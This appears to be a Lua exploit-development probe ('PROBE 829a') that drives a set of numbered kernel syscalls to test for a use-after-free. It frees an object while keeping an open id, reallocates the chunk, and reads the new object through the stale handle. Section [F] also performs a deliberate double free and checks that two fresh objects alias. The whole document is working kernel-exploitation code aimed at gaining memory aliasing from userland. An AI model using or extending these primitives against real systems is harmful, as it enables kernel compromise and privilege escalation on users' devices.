-- CRASH_CLASS: HIGH
-- PROBE 829a: after 550(create) frees the object, does the next create take the chunk?
--
-- Oracle: 555(id,n) with n > 0 returns 0 iff [obj+0x40] + n <= [obj+0x4c], and it
-- stores the sum. The create passes a3 to one of those dwords and a4 to the other
-- (a3=0, a4=0x80 gave counter 0 -> limit 0x80), so a fresh object made with
-- (a3=1, a4=2) reads back as "1 succeeds, 2 fails".
--
-- If a stale open id can read the *new* object's (a3,a4) after the old object was
-- freed, then an open id is a durable handle on a chunk that gets reallocated:
-- two objects in one 0x60 chunk, i.e. aliasing we can drive from userland.

print("=== PROBE 829a: freed-chunk reuse seen through the stale id ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end
local function call(sc, ...)
    local a = {...}
    local ok, r = pcall(function() return sc(unpack(a)) end)
    return to_num(r or 0)
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc552 = make_syscall(552)
local sc555 = make_syscall(555)
local sc669 = make_syscall(669)

-- [A] a fresh object with (a3=1, a4=2) reads as 1 ok / 2 not
local probe1 = call(sc549, mkname("ali1"), uint64(0x101), uint64(1), uint64(2))
print(string.format("[A] create(a3=1,a4=2) = %s", hx(probe1)))
print(string.format("[A] 555(1)=%s (expect 0, 1+1<=2)   555(2)=%s (expect -1, 1+2>2)",
    hx(call(sc555, uint64(probe1), uint64(1))), hx(call(sc555, uint64(probe1), uint64(2)))))
call(sc550, uint64(probe1))

-- [B] retire one object, keep an open id on it
local n = mkname("ali2")
local id0 = call(sc549, n, uint64(0x101), uint64(0), uint64(0x80))
local id1 = call(sc551, n)
print(string.format("[B] create=%s open=%s", hx(id0), hx(id1)))
print(string.format("[B] live: 555(+0x70)=%s (0 -> counter becomes 0x70)  555(+0x20)=%s (-1 -> 0x90>0x80)",
    hx(call(sc555, uint64(id1), uint64(0x70))), hx(call(sc555, uint64(id1), uint64(0x20)))))
print(string.format("[B] 550(create) = %s", hx(call(sc550, uint64(id0)))))

-- [C] what does the stale id see now?
print(string.format("[C] stale 555(+1)=%s  555(+2)=%s  555(+0x1000)=%s",
    hx(call(sc555, uint64(id1), uint64(1))),
    hx(call(sc555, uint64(id1), uint64(2))),
    hx(call(sc555, uint64(id1), uint64(0x1000)))))

-- [D] allocate an object with a distinctive (a3,a4) and read it through the stale id
local newid = call(sc549, mkname("ali3"), uint64(0x101), uint64(1), uint64(2))
print(string.format("[D] create(a3=1,a4=2) = %s", hx(newid)))
print(string.format("[D] stale 555(+1)=%s   (0 means the stale id reads the new object's 1+1<=2)",
    hx(call(sc555, uint64(id1), uint64(1)))))
print(string.format("[D] stale 555(+2)=%s   (-1 means the sum 2+2 now exceeds 2)",
    hx(call(sc555, uint64(id1), uint64(2)))))
print(string.format("[D] new obj's own id: 555(+1)=%s  (-1 here confirms both ids touch one chunk)",
    hx(call(sc555, uint64(newid), uint64(1)))))

-- [E] same question for a different allocator family: an aio object of 0x58/0x60
local n2 = mkname("ali4")
local id2 = call(sc549, n2, uint64(0x101), uint64(0), uint64(0x40))
local open2 = call(sc551, n2)
print(string.format("[E] create=%s open=%s", hx(id2), hx(open2)))
print(string.format("[E] 550(create) = %s", hx(call(sc550, uint64(id2)))))
local data = memory.alloc(0x100)
for i = 0, 0xFF do memory.write_byte(data + i, 0x41) end
local out = memory.alloc(0x20)
local r669 = call(sc669, uint64(0x1001), uint64(to_num(data)), uint64(1), uint64(1), uint64(to_num(out)))
print(string.format("[E] aio create(count=1) = %s", hx(r669)))
print(string.format("[E] stale 555(+1)=%s  (+2)=%s  (+0x1000)=%s",
    hx(call(sc555, uint64(open2), uint64(1))),
    hx(call(sc555, uint64(open2), uint64(2))),
    hx(call(sc555, uint64(open2), uint64(0x1000)))))

-- [F] double destroy: 550 then 552 on the same object, then watch the chunk
local n3 = mkname("ali5")
local a0 = call(sc549, n3, uint64(0x101), uint64(0), uint64(0x40))
local a1 = call(sc551, n3)
print(string.format("[F] create=%s open=%s", hx(a0), hx(a1)))
print(string.format("[F] 550(create)=%s", hx(call(sc550, uint64(a0)))))
print(string.format("[F] 552(open)=%s  (second free of the same chunk?)", hx(call(sc552, uint64(a1)))))
print(string.format("[F] stale 555(+1)=%s  (+2)=%s",
    hx(call(sc555, uint64(a1), uint64(1))), hx(call(sc555, uint64(a1), uint64(2)))))
local twin1 = call(sc549, mkname("ali6"), uint64(0x101), uint64(3), uint64(7))
local twin2 = call(sc549, mkname("ali7"), uint64(0x101), uint64(4), uint64(9))
print(string.format("[F] after double free, two creates = %s %s", hx(twin1), hx(twin2)))
print(string.format("[F] 555(twin1,+1)=%s (+0x10)=%s   555(twin2,+1)=%s (+0x10)=%s",
    hx(call(sc555, uint64(twin1), uint64(1))), hx(call(sc555, uint64(twin1), uint64(0x10))),
    hx(call(sc555, uint64(twin2), uint64(1))), hx(call(sc555, uint64(twin2), uint64(0x10)))))

print("[G] alive=true")
print("=== PROBE 829a COMPLETE ===")
